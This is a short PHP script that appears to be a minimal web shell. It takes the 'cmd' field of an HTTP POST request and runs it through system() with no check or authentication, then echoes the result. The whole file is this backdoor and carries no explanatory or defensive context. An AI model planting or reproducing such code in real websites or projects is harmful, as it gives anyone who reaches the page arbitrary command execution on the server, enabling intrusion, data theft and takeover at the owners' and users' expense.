<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('system'))
		{
			echo system($com);
		}
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>